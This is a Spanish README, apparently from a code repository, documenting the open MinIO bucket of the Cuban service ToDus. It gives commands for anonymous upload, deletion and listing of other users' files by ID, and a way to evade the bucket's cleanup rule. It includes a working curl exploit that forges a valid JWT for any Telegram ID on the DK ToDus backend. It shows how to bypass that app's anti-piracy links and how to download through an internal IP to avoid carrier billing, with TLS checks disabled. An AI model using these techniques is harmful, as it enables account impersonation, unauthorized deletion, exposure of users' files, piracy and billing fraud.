# ToDus S3 API — Documentación completa del bucket público de ToDus

> **Actualizado:** 2026-10-27 · Endpoint `s3.todus.cu/stream` verificado con PUT/HEAD/GET/DELETE/LIST.
> Cobertura ampliada con backend DK ToDus, whitelist de prefijos, formato persistente, rate-limiting y listing.

Servidor **MinIO** anónimo de la plataforma cubana **ToDus** para almacenar y compartir archivos por HTTP. **No requiere autenticación** para subir (PUT), bajar (GET/HEAD), borrar (DELETE) ni **listar** (GET con `list-type=2`).

---

## Índice

- [1. Base URL y formato de enlaces](#1-base-url-y-formato-de-enlaces)
- [2. ⚠️ Whitelist de prefijos y formato persistente](#2--whitelist-de-prefijos-y-formato-persistente)
- [3. Subir archivo — `PUT`](#3-subir-archivo--put)
- [4. Comprobar existencia — `HEAD`](#4-comprobar-existencia--head)
- [5. Descargar archivo — `GET` (con rangos)](#5-descargar-archivo--get-con-rangos)
- [6. Borrar archivo — `DELETE`](#6-borrar-archivo--delete)
- [7. Listar bucket — `GET ?list-type=2`](#7-listar-bucket--get-list-type2)
- [8. Rate limiting](#8-rate-limiting)
- [9. Códigos de respuesta](#9-codigos-de-respuesta)
- [10. Limitaciones y notas](#10-limitaciones-y-notas)
- [11. Backend DK ToDus (API alternativa)](#11-backend-dk-todus-api-alternativa)
- [12. Cifrado de enlaces `dktodus.wev.cu/download/<token>`](#12-cifrado-de-enlaces-dktoduswevcudownloadtoken)
- [13. Ejemplos en código](#13-ejemplos-en-codigo)
- [14. SDK Python recomendado](#14-sdk-python-recomendado)
- [15. 🆓 Sistema UDYAT — descargar sin gastar MB](#15--sistema-udyat--descargar-sin-gastar-mb)
- [16. Referencia de la implementación original en el bot](#16-referencia-de-la-implementacion-original-en-el-bot)

---

## 1. Base URL y formato de enlaces

```
https://s3.todus.cu/stream/<carpeta>/<nombre>
```

| Concepto | Valor |
|---|---|
| **Base** | `https://s3.todus.cu/stream` |
| **Carpeta** | `<prefijo>/<subcarpeta>/<user_id>` (ver [§2](#2--whitelist-de-prefijos-y-formato-persistente)) |
| **Nombre** | Nombre del archivo (URL-encoding con `quote(name, safe="")`) |
| **Bucket S3** | `stream` |

Ejemplo real verificado (formato **persistente**):

```
https://s3.todus.cu/stream/users/df/5431977626/Cyberpunk_Edgerunners_S02E03_DUAL_AUDIO_JAP_ENG_1080.mkv
```

---

## 2. ⚠️ Whitelist de prefijos y formato persistente

> **CRÍTICO** — El servidor MinIO **borra automáticamente** los archivos subidos bajo prefijos o rutas no reconocidas. El borrado ocurre entre **30 segundos y varias horas** después de la subida, **sin notificación**.

### Prefijos raíz permitidos (whitelist)

| Prefijo | Estado | Notas |
|---|---|---|
| `users/` | ✅ Persiste | Usado por **DK ToDus** (bot `@DkTodusbot`) |
| `hi/` | ✅ Persiste | Otro bot de ToDus |
| `dk/` | ⚠️ Funcionó históricamente | En pruebas recientes se vaciaba |
| `iro/`, `IroS3Dl/`, `GRATIS/` | ❌ Se borran solos | Tests Oct 2026 |
| Cualquier otro (`todus/`, `tg/`, `music/`, `admin/`, etc.) | ❌ Se borran solos | Tests Oct 2026 |

### Formato de subcarpeta (¡importante!)

Dentro de `users/`, **solo persiste** el formato:

```
users/df/<numeric_user_id>/<archivo>
```

Otros formatos probados bajo `users/`:

| Formato | Resultado |
|---|---|
| `users/df/7970466590/archivo.mp4` | ✅ Persiste (T+93s = HTTP 200) |
| `users/tg_7970466590/archivo.mp4` | ❌ Se borra (T+93s = HTTP 404) |
| `users/iro/7970466590/archivo.mp4` | ❌ Se borra (T+90s = HTTP 404) |

> **Hipótesis:** MinIO tiene un lifecycle rule que solo respeta el patrón `users/df/<digits>/`. Otros formatos caen en una regla de expiración corta.

### Recomendación para bots nuevos

Usar **siempre** el formato:

```python
folder = f"users/df/{user_id}"
url = f"https://s3.todus.cu/stream/{folder}/{quote(filename, safe='')}"
```

---

## 3. Subir archivo — `PUT`

Sube el contenido del cuerpo de la petición al objeto indicado por la URL.

### Petición

```http
PUT /stream/users/df/7970466590/mi-archivo.zip HTTP/2
Host: s3.todus.cu
Content-Type: application/octet-stream
Content-Length: 12345
```

| Cabecera | Valor | Obligatorio |
|---|---|---|
| `Content-Type` | `application/octet-stream` | No (default) |
| `Content-Length` | Tamaño en bytes | Sí (recomendado) |

### curl

```bash
curl -X PUT \
     --data-binary @ruta/al/archivo \
     -H "Content-Type: application/octet-stream" \
     "https://s3.todus.cu/stream/users/df/7970466590/mi-archivo.zip"
```

### Respuesta

```http
HTTP/2 200
content-length: 0
etag: "b5efe785eda0ba3e6cb4d840e0aa21c7"
server: MinIO
x-amz-id-2: 2e12676b2b1532b88dc99059491da4a333a59feba1627b808ccd8a669392eeaa
x-amz-request-id: 18E201114D04D2F9
x-ratelimit-limit: 12333
x-ratelimit-remaining: 12328
```

> **Buena práctica:** Hacer un `HEAD` después del `PUT` para confirmar que el objeto quedó guardado y que **no fue borrado por la regla de prefijo** (ver [§2](#2--whitelist-de-prefijos-y-formato-persistente)).

### Reintentos

Ante `5xx`, `429` o fallos de red, reintentar con **backoff exponencial** (1s, 2s, 4s... hasta 30s máximo, 3 intentos por defecto).

```python
for attempt in range(1, 4):
    try:
        resp = session.put(url, data=reader, ...)
        if resp.status_code >= 500 or resp.status_code == 429:
            if attempt < 3:
                time.sleep(min(30.0, 2.0 ** (attempt - 1)))
                continue
        # ...
    except (ConnectionError, Timeout) as e:
        if attempt < 3:
            time.sleep(min(30.0, 2.0 ** (attempt - 1)))
            continue
        raise
```

---

## 4. Comprobar existencia — `HEAD`

Devuelve metadatos del objeto sin descargarlo.

```bash
curl -sSI "https://s3.todus.cu/stream/users/df/7970466590/mi-archivo.zip"
```

```http
HTTP/2 200
accept-ranges: bytes
content-length: 298565591
content-type: application/octet-stream
etag: "dc1e8f444ba101a961cca6a964596ad2"
last-modified: Tue, 27 Oct 2026 03:15:55 GMT
server: MinIO
strict-transport-security: max-age=31536000; includeSubDomains
```

| Código | Significado |
|---|---|
| `200` | El objeto existe |
| `404` + `x-minio-error-code: NoSuchKey` | No existe (o fue borrado por lifecycle) |

### Detectar borrado por lifecycle

Si un archivo que subiste hace minutos ahora da 404 sin que tú lo hayas borrado, casi seguro cayó en la regla de prefijo (ver [§2](#2--whitelist-de-prefijos-y-formato-persistente)).

---

## 5. Descargar archivo — `GET` (con rangos)

Acceso de solo lectura al objeto. **Soporta rangos** (`accept-ranges: bytes`), útil para descargas multi-hilo y resumibles.

```bash
curl -o archivo.bin "https://s3.todus.cu/stream/users/df/7970466590/mi-archivo.zip"
```

### Descarga parcial (rango)

```bash
# Primeros 1024 bytes
curl -H "Range: bytes=0-1023" \
     "https://s3.todus.cu/stream/users/df/7970466590/mi-archivo.zip" \
     -o parte.bin
```

Respuesta:

```http
HTTP/2 206
content-length: 1024
content-range: bytes 0-1023/298565591
accept-ranges: bytes
```

### Descarga multi-hilo

Divide el archivo en N partes y descarga cada una en paralelo:

```python
import concurrent.futures
import requests

def download_chunk(url, start, end, output_path):
    headers = {"Range": f"bytes={start}-{end}"}
    resp = requests.get(url, headers=headers, stream=True)
    with open(output_path, "wb") as f:
        for chunk in resp.iter_content(1024 * 1024):
            f.write(chunk)

def download_multithread(url, output_path, total_size, threads=4):
    chunk_size = total_size // threads
    parts = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as exe:
        futures = []
        for i in range(threads):
            start = i * chunk_size
            end = (start + chunk_size - 1) if i < threads - 1 else total_size - 1
            part_path = f"{output_path}.part{i}"
            parts.append(part_path)
            futures.append(exe.submit(download_chunk, url, start, end, part_path))
        concurrent.futures.wait(futures)
    # Unir partes
    with open(output_path, "wb") as out:
        for part in parts:
            with open(part, "rb") as p:
                out.write(p.read())
            import os; os.unlink(part)
```

---

## 6. Borrar archivo — `DELETE`

MinIO acepta `DELETE` sin autenticación sobre la URL pública.

```bash
curl -X DELETE "https://s3.todus.cu/stream/users/df/7970466590/mi-archivo.zip"
```

| Código | Significado |
|---|---|
| `200`, `204` | Borrado correcto |
| `404` | Ya no existía (también se considera éxito) |
| Otro | Fallo |

---

## 7. Listar bucket — `GET ?list-type=2`

> **El bucket es totalmente público** — cualquiera puede listar todos los archivos con la API S3 estándar.

### Listar TODO el bucket

```bash
curl "https://s3.todus.cu/stream?list-type=2&max-keys=1000"
```

Respuesta (XML):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Name>stream</Name>
  <KeyCount>2</KeyCount>
  <MaxKeys>1000</MaxKeys>
  <IsTruncated>false</IsTruncated>
  <Contents>
    <Key>users/df/5431977626/Cyberpunk_Edgerunners_S02E03_DUAL_AUDIO_JAP_ENG_1080.mkv</Key>
    <LastModified>2026-10-27T03:15:55.492Z</LastModified>
    <ETag>"dc1e8f444ba101a961cca6a964596ad2"</ETag>
    <Size>298565591</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
  <Contents>
    <Key>users/df/5904050462/Lupin_S01E01_Capitulo_1.mp4</Key>
    <LastModified>2026-10-27T03:59:47.204Z</LastModified>
    <ETag>"..."</ETag>
    <Size>841177422</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
</ListBucketResult>
```

### Filtrar por prefijo

```bash
# Solo archivos de un usuario específico
curl "https://s3.todus.cu/stream?list-type=2&prefix=users/df/5431977626/"

# Solo archivos bajo users/
curl "https://s3.todus.cu/stream?list-type=2&prefix=users/&max-keys=1000"
```

### Paginación (continuation token)

Si `IsTruncated=true`, usar `NextContinuationToken` para la siguiente página:

```bash
# Primera página
curl "https://s3.todus.cu/stream?list-type=2&max-keys=200"

# Siguiente página con el token de la respuesta anterior
curl "https://s3.todus.cu/stream?list-type=2&max-keys=200&continuation-token=<NextContinuationToken>"
```

### Script completo de listing

```bash
# Lista todos los archivos del bucket con su URL pública
NCT=""
while true; do
  if [ -z "$NCT" ]; then
    URL="https://s3.todus.cu/stream?list-type=2&max-keys=1000"
  else
    URL="https://s3.todus.cu/stream?list-type=2&max-keys=1000&continuation-token=$NCT"
  fi
  RESP=$(curl -sS "$URL")
  echo "$RESP" | python3 -c "
import sys, re
from urllib.parse import quote
xml = sys.stdin.read()
for c in re.findall(r'<Contents>(.*?)</Contents>', xml, re.DOTALL):
    key = re.search(r'<Key>(.*?)</Key>', c).group(1)
    sz = int(re.search(r'<Size>(.*?)</Size>', c).group(1))
    lm = re.search(r'<LastModified>(.*?)</LastModified>', c).group(1)
    encoded = '/'.join(quote(p, safe='') for p in key.split('/'))
    print(f'{lm}\t{sz}\thttps://s3.todus.cu/stream/{encoded}')
"
  NCT=$(echo "$RESP" | python3 -c "
import sys, re
m = re.search(r'<NextContinuationToken>(.*?)</NextContinuationToken>', sys.stdin.read())
print(m.group(1) if m else '')
")
  [ -z "$NCT" ] && break
done
```

---

## 8. Rate limiting

Cada respuesta incluye cabeceras `x-ratelimit-*`:

```http
x-ratelimit-limit: 12333
x-ratelimit-remaining: 12328
```

| Cabecera | Significado |
|---|---|
| `x-ratelimit-limit` | Total de peticiones permitidas en la ventana actual |
| `x-ratelimit-remaining` | Peticiones restantes |

> Cuando `x-ratelimit-remaining` se acerca a 0, hacer pausas entre peticiones para evitar `429 Too Many Requests`.

---

## 9. Códigos de respuesta

| Código | Significado |
|---|---|
| `200` | OK (subida, descarga, delete, listing) |
| `201` | Creado (equivalente a OK) |
| `204` | Sin contenido — borrado correcto |
| `206` | Partial Content — respuesta a `Range` |
| `400` | Petición mal formada |
| `404` | No existe el objeto (`x-minio-error-code: NoSuchKey`) |
| `429` | Límite de peticiones — transitorio, reintentar |
| `5xx` | Error de servidor — transitorio, reintentar |

---

## 10. Limitaciones y notas

- **Tamaño:** Hasta **5 GB por archivo** verificado en producción con streaming de 1 MB por chunk.
- **Sin auth:** El bucket es completamente público. Cualquiera puede subir, bajar, borrar y listar.
- **ETag:** Calculado por MinIO. Para archivos pequeños es el MD5; para archivos grandes (multipart) es un hash compuesto.
- **TTL por lifecycle:** MinIO borra archivos bajo prefijos no whitelisteados (ver [§2](#2--whitelist-de-prefijos-y-formato-persistente)). Los archivos bajo `users/df/<id>/` parecen persistir días.
- **Streaming síncrono:** El PUT es síncrono. Para archivos grandes, usar `requests` con `data=file_like` para no cargar todo en memoria.
- **Certificado TLS:** Válido para `s3.todus.cu`. La app IroS3Dl fuerza SNI en algunas IPs gratuitas de ToDus, pero desde Internet normal no hace falta.
- **Velocidad:** Depende de la conexión. Tests reales: ~10 MB/s de subida desde un container en Hong Kong.

---

## 11. Backend DK ToDus (API alternativa)

> Descubierto analizando la app DK ToDus (Flutter APK). Es una capa adicional sobre el S3 con autenticación por Telegram y anti-piratería.

DK ToDus tiene un backend FastAPI con MongoDB Atlas que complementa al S3:

| URL | Estado |
|---|---|
| `https://dk-todus-backend.fastapicloud.dev` | ✅ Online |
| `https://dk-todus-backend.vercel.app` | ✅ Online |
| `https://dk-todus-backend.onrender.com` | ⚠️ A veces 503 |

### Endpoints descubiertos

| Endpoint | Método | Auth | Función |
|---|---|---|---|
| `/api/v1/auth/init` | POST | No | Devuelve `temp_token` + URL de auth con `@DkTodusbot` |
| `/api/v1/auth/verify` | POST | No | Intercambia `temp_token` por JWT (acepta cualquier `telegram_id`) |
| `/api/v1/auth/check?token=...` | GET | No | Estado del flujo de auth |
| `/api/v1/auth/me` | GET | Bearer JWT | Perfil del usuario |
| `/api/v1/uploads?limit=N&since_hours=H` | GET | Bearer JWT | Lista TUS subidas (filtrado por `telegram_id` del JWT) |
| `/api/v1/uploads` | POST | Bearer JWT | Registra nueva subida |
| `/api/v1/devices/register` | POST | No | Registra dispositivo (anti-piratería) |
| `/api/v1/devices/status?device_id=...` | GET | No | Estado de ban del dispositivo |
| `/api/v1/devices/report-downloads` | POST | No | Reporta descargas (anti-piratería) |
| `/api/v1/admin/devices` | GET | Bearer JWT admin | Lista dispositivos |
| `/api/v1/admin/devices/ban` | POST | Bearer JWT admin | Banea dispositivo |
| `/api/v1/admin/devices/unban` | POST | Bearer JWT admin | Desbanea dispositivo |
| `/api/v1/admin/devices/strikes` | GET | Bearer JWT admin | Strikes de un dispositivo |
| `/api/v1/stats` | GET | No | Estadísticas globales (archivos, tamaño) |
| `/api/v1/health-db` | GET | No | Estado de la BD |
| `/docs` | GET | No | Swagger UI |
| `/openapi.json` | GET | No | OpenAPI 3.1 spec |

### ⚠️ Vulnerabilidad de auth

El endpoint `POST /api/v1/auth/verify` **NO valida** que el usuario haya hecho `/start` en el bot. Acepta cualquier `temp_token` + `telegram_id` inventado y devuelve un JWT válido:

```bash
# 1. Init
TEMP_TOKEN=$(curl -sS -X POST "https://dk-todus-backend.fastapicloud.dev/api/v1/auth/init" \
  -H "Content-Type: application/json" -d '{}' | python3 -c "import sys, json; print(json.load(sys.stdin)['temp_token'])")

# 2. Verify (sin haber hablado con el bot)
JWT=$(curl -sS -X POST "https://dk-todus-backend.fastapicloud.dev/api/v1/auth/verify" \
  -H "Content-Type: application/json" \
  -d "{\"temp_token\":\"$TEMP_TOKEN\",\"telegram_id\":7970466590,\"username\":\"test\"}" \
  | python3 -c "import sys, json; print(json.load(sys.stdin)['jwt_token'])")

# 3. Usar JWT
curl -sS "https://dk-todus-backend.fastapicloud.dev/api/v1/auth/me" \
  -H "Authorization: Bearer $JWT"
```

### Stats globales (sin auth)

```bash
curl "https://dk-todus-backend.fastapicloud.dev/api/v1/stats"
# → {"personal_stats":{"files_count":271,"total_size_bytes":196636148455,"active_count":270}}
```

---

## 12. Cifrado de enlaces `dktodus.wev.cu/download/<token>`

La app DK ToDus **rechaza** los enlaces directos de `s3.todus.cu` y solo acepta enlaces cifrados `dktodus.wev.cu/download/<token>` (que solo ella puede abrir).

### Formato del token

```
1 byte version (0x01) + IV + ciphertext + MAC = 129 bytes
→ base64url sin padding (168 chars)
```

### Esquema

- **Librería:** `pointycastle` (Dart) — ChaCha20-Poly1305 / AES-GCM
- **Clave derivada:** HKDF desde `device_id` + JWT del usuario
- **Resultado:** cada enlace es específico al dispositivo que lo descargó

### Mensaje de la app al rechazar S3 directo

> *"Los enlaces directos de s3.todus.cu ya no se aceptan. Usa el enlace que te da el bot (dktodus.wev.cu/download/...) con la app DK ToDus."*

### Workaround

**No hace falta romper el cifrado.** El bucket S3 es público y se puede listar directamente (ver [§7](#7-listar-bucket--get-list-type2)). Las URLs `s3.todus.cu/stream/<key>` funcionan en cualquier navegador/reproductor sin pasar por DK ToDus.

---

## 13. Ejemplos en código

| Lenguaje | Archivo | Descripción |
|---|---|---|
| Python (requests) | `examples/python_upload.py` | Subida con formato persistente + verificación HEAD |
| Python (asíncrono) | `examples/python_async.py` | Subida asíncrona con aiohttp |
| Python (SDK) | `examples/todus_sdk.py` | SDK completo: upload/download/list/delete |
| Python (listing) | `examples/python_list_bucket.py` | Listar bucket completo con paginación |
| Python (DK backend) | `examples/python_dktodus_backend.py` | Auth + list uploads vía backend DK ToDus |
| **Python (UDYAT)** | `examples/udyat_download.py` | **Descarga sin gastar MB** vía IP gratuita de ToDus |
| **Bash (UDYAT)** | `examples/udyat_download.sh` | **Descarga sin gastar MB** con wget (Termux/Linux) |
| JavaScript (Node) | `examples/node_upload.mjs` | Subida con fetch + streams |
| curl (con reintentos) | `examples/curl_with_retry.sh` | Shell script robusto |

Ver [examples/README.md](examples/README.md) para más detalles.

---

## 14. SDK Python recomendado

`examples/todus_sdk.py` es un SDK completo. Uso:

```python
from todus_sdk import ToDusS3

s3 = ToDusS3()

# Subir archivo
result = s3.upload("mi-archivo.zip", user_id=7970466590, progress=print)
print(result.url)  # https://s3.todus.cu/stream/users/df/7970466590/mi-archivo.zip
print(result.size, result.seconds, result.speed_mbs)

# Descargar
s3.download(result.url, "descarga.zip")

# Verificar existencia
info = s3.head(result.url)
print(info.exists, info.size, info.etag)

# Listar archivos de un usuario
for entry in s3.list_user(7970466590):
    print(entry.key, entry.size, entry.url)

# Borrar
s3.delete(result.url)
```

---

## 15. 🆓 Sistema UDYAT — descargar sin gastar MB

> **Para usuarios en Cuba** — Descarga archivos del S3 de ToDus **SIN consumir megas** de internet nacional de ETECSA.

### ¿Cómo funciona?

En Cuba, ETECSA factura el tráfico a internet "nacional" (extranjero). Pero el servidor S3 de ToDus tiene una **IP gratuita interna** accesible desde la red cubana SIN consumo de megas:

| IP | Tipo | Estado |
|---|---|---|
| `152.207.206.86` | IP gratuita clásica | ✅ Recomendada |
| `152.207.206.88` | DNS actual (respaldo) | ⚠️ Puede consumir megas |

El truco: reescribir `https://s3.todus.cu/...` → `https://152.207.206.86/...` + header `Host: s3.todus.cu`. El servidor MinIO sirve el archivo desde la IP interna, pero como el header `Host` sigue siendo `s3.todus.cu`, sabe qué vhost servir.

### Cabeceras exactas del sistema UDYAT

```http
GET /stream/users/df/7970466590/archivo.mp4 HTTP/1.1
Host: s3.todus.cu
User-Agent: Wget/1.21.3
Accept: */*
Accept-Encoding: identity
Accept-Language: es-ES,es;q=0.9,en;q=0.8
Connection: keep-alive
```

> **TLS:** La IP gratuita sirve un **certificado self-signed** para `s3.todus.cu`. Hay que desactivar la verificación TLS (`--no-check-certificate` en wget, `verify=False` en requests).

### Script Bash (Termux / Linux / macOS)

```bash
./examples/udyat_download.sh https://s3.todus.cu/stream/users/df/7970466590/pelicula.mp4
```

Equivalente manual con wget:

```bash
wget --no-check-certificate \
     --header="Host: s3.todus.cu" \
     --user-agent="Wget/1.21.3" \
     --continue \
     "https://152.207.206.86/stream/users/df/7970466590/pelicula.mp4"
```

### Script Python (multiplataforma)

```bash
# Descarga simple
python examples/udyat_download.py https://s3.todus.cu/stream/users/df/7970466590/pelicula.mp4

# Multi-hilo (4 conexiones con Range, más rápida)
python examples/udyat_download.py https://s3.todus.cu/stream/users/df/7970466590/pelicula.mp4 --threads 4

# Test de conectividad
python examples/udyat_download.py --test
```

### Ejemplo Python mínimo

```python
import requests
import urllib3
urllib3.disable_warnings()

URL = "https://s3.todus.cu/stream/users/df/7970466590/archivo.mp4"
FREE_IP = "152.207.206.86"

# Reescribir URL
new_url = URL.replace("s3.todus.cu", FREE_IP)

# Descargar con cabeceras UDYAT
resp = requests.get(
    new_url,
    headers={
        "Host": "s3.todus.cu",
        "User-Agent": "Wget/1.21.3",
        "Accept": "*/*",
    },
    verify=False,  # cert self-signed
    stream=True,
)

with open("archivo.mp4", "wb") as f:
    for chunk in resp.iter_content(1024 * 1024):
        if chunk:
            f.write(chunk)

print("✅ Descargado sin gastar MB")
```

### Detección de la IP gratuita (pre-flight check)

Antes de descargar, hacer un HEAD corto (3s) a la IP gratuita:

```bash
curl -sS -o /dev/null -w "%{http_code}" \
    --max-time 3 \
    --insecure \
    -H "Host: s3.todus.cu" \
    -H "User-Agent: Wget/1.21.3" \
    -I "https://152.207.206.86/"
```

- HTTP 200/403/404 → IP responde, se puede descargar sin gastar MB ✅
- Timeout/connection refused → IP no responde, fallback a URL normal (consumirá MB) ❌

### Formato `.udyat` (manifiesto)

La app IroS3Dl y el sistema UDYAT original usan archivos `.udyat` (JSON) con metadatos:

```json
{
  "f": "pelicula.mp4",          // filename
  "s": 298565591,                // size en bytes
  "md5": "dc1e8f444ba101a961cca6a964596ad2",
  "c": [                         // chunks (para multi-hilo)
    {"url": "https://152.207.206.86/stream/users/df/7970466590/pelicula.mp4", "size": 298565591}
  ],
  "h": "152.207.206.86",         // IP de respaldo
  "original_host": "s3.todus.cu",
  "platform": "android",
  "token": "..."                  // opcional, para DK ToDus
}
```

Para importar: la app IroS3Dl acepta archivos `.udyat` directamente (long-press el botón ➕ en la pantalla de descargas).

### Limitaciones

- **Solo desde Cuba** — Las IPs gratuitas solo responden desde la red cubana de ETECSA.
- **TLS self-signed** — Hay que desactivar verificación de certificado.
- **IP puede cambiar** — Si deja de funcionar, verificar con el bot `@DkTodusbot` o probar `152.207.206.88`.
- **No funciona con `dktodus.wev.cu`** — Ese dominio es un proxy cifrado que solo abre la app DK ToDus. UDYAT solo aplica a URLs `s3.todus.cu/stream/...` directas.

---

## 16. Referencia de la implementación original en el bot

- **Repo:** `juanbas2005/S3` · módulo `bot/s3.py`
- **Funciones:** `build_url`, `folder_for_user`, `upload_to_s3`, `delete_from_s3`, `delete_many_from_s3`
- **Config:** `s3_base`, `s3_prefix` (whitelist), `upload_retries`, `max_concurrent_jobs`
- **Formato persistente:** `users/df/<user_id>/` (descubierto tras debug extensivo Oct 2026)

---

## Licencia

Documentación y ejemplos bajo MIT (ver `LICENSE`).
